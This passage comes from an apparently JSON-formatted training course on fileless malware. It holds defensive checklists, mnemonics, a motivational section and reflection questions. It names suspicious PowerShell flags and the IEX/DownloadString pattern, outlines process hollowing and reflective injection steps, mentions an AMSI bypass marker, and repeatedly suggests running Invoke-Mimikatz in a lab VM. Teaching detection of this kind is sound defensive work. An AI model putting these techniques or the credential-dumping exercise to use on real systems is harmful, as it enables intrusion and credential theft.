subscriptions (should be zero)\n   - Alert on any new WMI event consumer\n   - Sysmon Event ID 19-21 for WMI events\n\n3. Memory Protection:\n   - EDR with memory scanning (CrowdStrike, SentinelOne)\n   - Windows Defender Exploit Guard\n   - Monitor for process injection (Sysmon Event ID 8)\n\n4. Network Monitoring:\n   - Long-term NetFlow retention\n   - Beaconing detection (regular intervals = C2)\n   - TLS inspection (decrypt and inspect HTTPS)\n   - DNS monitoring (C2 often uses DNS)\n\n5. Behavioral Detection:\n   - Unusual PowerShell from service accounts\n   - PowerShell network connections\n   - WMI lateral movement\n   - Process hollowing detection\n\nThe Lesson:\n\nAPT29 demonstrates that determined attackers can remain undetected for months using fileless techniques. Traditional security controls (AV, firewalls, IDS) are insufficient. Organizations need:\n\n- Behavioral analytics (EDR)\n- Memory forensics capability\n- PowerShell logging and monitoring\n- Threat hunting (proactive searching)\n- Assume breach mindset\n\nFileless malware is not the future - it's the present. APT29 proved this at the highest levels of sophistication."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "title": "Fileless Malware Memory Hooks",
        "text": "Use these mnemonics to remember fileless malware concepts:\n\n1. Why Fileless Works: 'NABE'\n   N - No files (AV can't scan what doesn't exist)\n   A - Abuses legitimate tools (PowerShell, WMI)\n   B - Behavioral analysis required (signatures useless)\n   E - Evades whitelisting (uses allowed applications)\n\n2. PowerShell Red Flags: 'NOWIN'\n   N - NoProfile (-NoP)\n   O - (Enc)Oded command (-Enc, -EncodedCommand)\n   W - Window Hidden (-W Hidden)\n   I - (Non)Interactive (-NonI)\n   N - (Download from) Net (DownloadString, IEX)\n\n   Any PowerShell with 3+ of these = suspicious\n\n3. Memory Injection Techniques: 'PHR-D'\n   P - Process Hollowing (create suspended, replace memory, resume)\n   H - (DLL) Hijacking (place malicious DLL in search path)\n   R - Reflective loading (DLL in memory without LoadLibrary)\n   D - (Atom Bombing, Process) Doppelganging (advanced variants)\n\n4. LOLBins Most Abused: 'PRWM-CB'\n   P - PowerShell\n   R - Rundll32\n   W - WMI/WMIC\n   M - Mshta\n   C - Certutil\n   B - Bitsadmin\n\n   All legitimate Windows tools, all abused by malware\n\n5. Volatility Plugins for Fileless: 'PHMM'\n   P - Pslist / Psscan (find hidden processes)\n   H - Hollowfind (detect process hollowing)\n   M - Malfind (find injected code, RWX memory)\n   M - Modules (compare loaded DLLs to disk)\n\n6. PowerShell Logging: 'SMT'\n   S - Script Block Logging (Event ID 4104 - script content)\n   M - Module Logging (modules loaded)\n   T - Transcription (full session recording)\n\n   Enable all three for complete visibility\n\n7. Process Hollowing Steps: 'CUWAR'\n   C - Create process suspended\n   U - Unmap original memory\n   W - Write malicious code\n   A - (Set entry point with SetThread)Context\n   R - Resume thread\n\n8. Reflective DLL Injection: 'RRM'\n   R - Read DLL into memory\n   R - Resolve imports manually\n   M - (Call DLL)Main without LoadLibrary\n\n   DLL never appears in module list\n\n9. Detection Strategy: 'BMNE'\n   B - Behavioral analysis (not signature-based)\n   M - Memory forensics (Volatility, pe-sieve)\n   N - Network monitoring (beaconing, C2)\n   E - Event logging (Sysmon, PowerShell logs)\n\n10. Sysmon Event IDs for Fileless: '1-7-8'\n    1 - Process creation (PowerShell with suspicious flags)\n    7 - Image loaded (DLL injection)\n    8 - CreateRemoteThread (process injection)\n\n11. AMSI Purpose:\n    Memory Hook: 'Antimalware Scan Interface'\n    - Scans scripts BEFORE execution\n    - Catches malicious PowerShell, VBScript, JScript\n    - Bypassed by attackers (amsiInitFailed)\n    - Monitor for bypass attempts\n\n12. APT29 Fileless Techniques: 'PWPL'\n    P - PowerShell downloaders (IEX, DownloadString)\n    W - WMI persistence (event subscriptions)\n    P - Process hollowing (SUNSPOT)\n    L - LOLBins (Rundll32, CertUtil, BITS)\n\n13. Memory Section Permissions: 'RWX = Bad'\n    R - Read\n    W - Write\n    X - Execute\n\n    RWX together = injected code (legitimate DLLs are R-X)\n\n14. Empire/Metasploit Stager Pattern:\n    Memory Hook: 'Download-Decode-Execute'\n    1. Download encrypted stage 2\n    2. Decode/decrypt in memory\n    3. Execute via IEX\n\n15. WMI Persistence Components: 'FCB' (same as lesson 6)\n    F - Filter (trigger)\n    C - Consumer (action)\n    B - Binding (link)\n\n16. Mimikatz in Memory: 'ILDA'\n    I - IEX downloads Invoke-Mimikatz\n    L - Loads entirely in PowerShell memory\n    D - Dumps LSASS credentials\n    A - (No) Anti-virus detection (no file)\n\n17. Network C2 Obfuscation: 'HDJB'\n    H - HTTPS (encrypted)\n    D - Domain fronting (hide behind CDN)\n    J - Jitter (randomize beaconing interval)\n    B - (Legitimate-looking) Domains\n\n18. Process Hollowing Forensics: 'MVC'\n    M - Memory sections RWX (execute + write = suspicious)\n    V - VAD (Virtual Address Descriptor) shows unmapped regions\n    C - Compare process memory to disk file (strings differ)\n\nVisual Memory Technique:\n\nPicture a ghost (fileless):\n- No body (no files on disk)\n- Possesses people (injection into legitimate processes)\n- Invisible (evades AV)\n- Speaks through others (PowerShell, WMI, Rundll32)\n- Leaves only memories (memory-only artifacts)\n- Disappears when house demolished (reboot removes from RAM)\n\n19. Detection Challenges: 'SMNL'\n    S - Signature-based AV useless\n    M - Memory volatility (lost on reboot)\n    N - Network encrypted (HTTPS, DNS tunneling)\n    L - Looks legitimate (PowerShell, WMI)\n\n20. Defensive Layers: 'LBME'\n    L - Logging (PowerShell, Sysmon)\n    B - Behavioral analytics (EDR)\n    M - Memory protection (Exploit Guard)\n    E - Event monitoring (beaconing detection)\n\n    No single layer stops fileless. Need all four."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "title": "Mastering Fileless Malware Analysis",
        "text": "Fileless malware can feel overwhelming. You're used to analyzing .exe files, reverse engineering binaries, scanning for signatures. Now you're told 'the malware has no file.' How do you analyze something that doesn't exist on disk?\n\nThis is where many security professionals struggle. But here's the truth: Fileless malware isn't magic. It's just malware that operates in a different layer - memory instead of disk.\n\nThe Paradigm Shift:\n\nTraditional malware analysis:\n- Find malicious file\n- Open in IDA Pro or Ghidra\n- Reverse engineer\n- Understand functionality\n- Write signatures\n\nFileless malware analysis:\n- Detect suspicious behavior\n- Capture memory dump\n- Analyze PowerShell logs\n- Reconstruct attack chain\n- Write behavioral detections\n\nYou're not analyzing files anymore. You're analyzing behavior.\n\nWhy This Matters:\n\nFileless attacks now represent 40% of all attacks (CrowdStrike 2023). If you can only analyze file-based malware, you can only defend against 60% of attacks.\n\nBut here's the opportunity: Most security professionals still focus on files. Those who master fileless analysis are rare and highly valued.\n\nThe Skills That Set You Apart:\n\nWhen you can:\n- Read PowerShell logs and immediately identify Mimikatz\n- Use Volatility to find injected code in memory\n- Detect process hollowing from Sysmon logs\n- Recognize APT29-style tradecraft\n- Build EDR detection rules for fileless techniques\n\nYou're no longer a junior analyst. You're a threat hunter. And that's a different pay grade.\n\nThe Learning Curve:\n\nRight now, you might feel:\n'I barely understand how traditional malware works, and now I need to learn memory forensics?'\n'PowerShell looks like gibberish.'\n'How do I even start analyzing something I can't see?'\n\nEvery expert felt this way. The difference: They kept going.\n\nPractical Path Forward:\n\nWeek 1:\n- Enable PowerShell logging on your test system\n- Download Invoke-Mimikatz (education purpose)\n- Execute it\n- Analyze the logs\n\nYou'll see exactly what fileless malware looks like in logs. That one exercise teaches more than reading 10 articles.\n\nWeek 2:\n- Capture memory dump during Invoke-Mimikatz execution\n- Use Volatility's malfind plugin\n- See the injected Mimikatz code in PowerShell memory\n\nNow you understand memory forensics isn't theoretical - it's practical.\n\nWeek 3:\n- Use Process Hacker to explore process memory\n- Identify RWX memory sections\n- Compare running process to disk file\n\nNow you can detect process hollowing manually.\n\nWeek 4:\n- Install Sysmon with SwiftOnSecurity config\n- Repeat Invoke-Mimikatz\n- Analyze Sysmon Event ID 8 (CreateRemoteThread)\n\nNow you understand how EDR detects injection.\n\nFour weeks. Four hands-on exercises. You've gone from 'fileless is scary' to 'I can detect this.'\n\nThe Career Impact:\n\nSkills you're learning:\n- PowerShell analysis → Incident response\n- Memory forensics → Advanced threat hunting\n- Behavioral detection → EDR engineering\n- APT TTPs → Threat intelligence\n\nJob titles that need these skills:\n- Threat Hunter ($100-150K)\n- Incident Responder ($90-140K)\n- Malware Analyst ($95-145K)\n- Detection Engineer ($110-160K)\n- SOC Lead ($120-170K)\n\nEvery organization moving to EDR needs people who understand fileless threats. That's tens of thousands of jobs.\n\nThe Confidence Builder:\n\nYou've now learned:\n- How fileless malware works (techniques)\n- How to detect it (PowerShell logs, memory forensics)\n- How APT29 uses it (real-world context)\n- How to defend against it (AMSI, EDR, behavioral detection)\n\nThat's more than 90% of security professionals know about fileless malware.\n\nThe Challenge:\n\nThis week:\n1. Set up test environment\n2. Enable PowerShell logging\n3. Download Invoke-Mimikatz\n4. Execute it (in isolated VM!)\n5. Analyze the logs\n6. Capture memory dump\n7. Run Volatility malfind\n\nDoing this ONCE will transform your understanding from theoretical to practical.\n\nYou're Not Defending Against Files Anymore:\n\nThe security industry evolved:\n- 2000s: Signature-based AV\n- 2010s: Behavioral heuristics\n- 2020s: EDR and memory protection\n\nFileless malware forced this evolution. Organizations that adapt survive. Those that don't get breached.\n\nYou're learning to adapt. That's the difference between those who stay relevant and those who get left behind.\n\nThe Bigger Picture:\n\nYou've now completed advanced malware training:\n- Malware types and classifications\n- Static and dynamic analysis\n- Reverse engineering\n- Persistence mechanisms\n- Fileless and memory-only attacks\n\nYou have a complete malware analysis skillset. From basic trojan analysis to APT-level fileless attacks.\n\nNext Up:\n\nYou're ready for:\n- Red team operations (using these techniques offensively)\n- Blue team defense (building detection at scale)\n- Incident response (analyzing real breaches)\n- Threat intelligence (understanding adversary TTPs)\n\nEvery advanced security role builds on what you just learned.\n\nFinal Thought:\n\nFileless malware feels advanced because it is advanced. But 'advanced' just means 'unfamiliar.' Make it familiar through practice, and it becomes routine.\n\nAPT29 used fileless techniques to compromise SolarWinds and remain undetected for 9 months. You now understand how they did it and how to detect it.\n\nThat's not luck. That's learning. Keep going.\n\nSee you in the next domain."
      }
    },
    {
      "type": "reflection",
      "content": {
        "title": "Fileless Malware Reflection",
        "text": "Reflect on your understanding of fileless malware and memory-only attacks:\n\n1. Fileless vs File-Based:\n   - Why does fileless malware evade traditional antivirus? List three specific reasons.\n   - If malware has no files, what DO you analyze? Where are the artifacts?\n   - Can fileless malware be 100% file-free? (Hint: Think about initial infection)\n\n2. PowerShell Attacks:\n   - You see: powershell.exe -NoP -W Hidden -Enc ABCD1234... Why is each flag suspicious?\n   - How do you decode base64 PowerShell commands? Write the PowerShell one-liner.\n   - What's the difference between IEX (Invoke-Expression) and Import-Module?\n\n3. Memory Injection:\n   - Explain process hollowing in 3 steps to a non-technical manager.\n   - Why can't you just scan process memory with antivirus to detect injection?\n   - What's the difference between DLL injection and reflective DLL injection?\n\n4. Detection Strategies:\n   - You enable PowerShell logging. What Event ID shows script content? What log?\n   - How do you detect process injection with Sysmon? What Event ID?\n   - Volatility's malfind plugin detects what specific memory characteristic?\n\n5. APT29 Analysis:\n   - List three fileless techniques APT29 used in SolarWinds breach.\n   - Why was APT29 undetected for 9 months despite using fileless techniques?\n   - How would WMI event subscription persistence be detected?\n\n6. Living Off the Land:\n   - Name five legitimate Windows binaries commonly abused by malware.\n   - Why doesn't application whitelisting stop LOLBin abuse?\n   - How do you distinguish malicious use of Rundll32 from legitimate use?\n\n7. Memory Forensics:\n   - You capture memory dump. What's the first Volatility command to run?\n   - What does 'RWX memory section' indicate? Why is it suspicious?\n   - How do you extract a suspicious process's memory with Volatility?\n\n8. WMI Persistence:\n   - WMI persistence requires three components. Name them.\n   - Why is WMI persistence stealthy? Where is it stored?\n   - How do you enumerate WMI event subscriptions with PowerShell?\n\n9. Reflective Loading:\n   - What does 'reflective PE loading' mean? How is it different from normal LoadLibrary?\n   - Why don't reflective DLLs appear in Process Explorer's module list?\n   - What tools detect reflective DLL injection?\n\n10. Behavioral Detection:\n    - Traditional AV uses signatures. What does behavioral detection use instead?\n    - Give three behavioral indicators of Invoke-Mimikatz in PowerShell.\n    - Why is behavioral detection more effective against fileless malware?\n\n11. Practical Scenarios:\n    - You're incident responder called for 'suspicious PowerShell'. Walk through your analysis process (7 steps).\n    - Process Explorer shows powershell.exe with 500MB memory and network connections. What do you do?\n    - Your EDR alerts on 'process injection' for powershell.exe → svchost.exe. Explain what happened.\n\n12. Defense Strategies:\n    - Design a defense-in-depth strategy against fileless malware (4 layers minimum).\n    - Why isn't PowerShell logging alone sufficient?\n    - How does AMSI (Antimalware Scan Interface) help against fileless attacks?\n\n13. MITRE ATT&CK Mapping:\n    - Map fileless techniques to MITRE ATT&CK: PowerShell abuse, process injection, WMI persistence.\n    - What's the difference between T1059.001 (PowerShell) and T1055 (Process Injection)?\n    - How do you use ATT&CK framework for threat hunting?\n\n14. Real-World Application:\n    - You're SOC analyst. Endpoint EDR alerts on 'encoded PowerShell execution.' What's your response process?\n    - Your organization wants to block PowerShell entirely. Why is this bad? What do you recommend instead?\n    - Design detection rules for Invoke-Mimikatz without relying on file signatures.\n\n15. Knowledge Gaps:\n    - What concepts still feel unclear or incomplete?\n    - What hands-on lab would solidify your understanding?\n    - What fileless technique would you like to explore deeper?\n\n16. Next Steps:\n    - What will you practice this week? (Hint: Set up lab, execute Invoke-Mimikatz, analyze logs)\n    - Can you explain one fileless technique to a colleague?\n    - What malware domain do you want to learn next?\n\nTake 15-20 minutes to write answers. The goal isn't perfect answers - it's identifying what you know vs what needs practice.\n\nRevisit this after hands-on lab work. You'll be surprised how much clearer everything becomes after seeing it in action."
      }
    }
  ]
}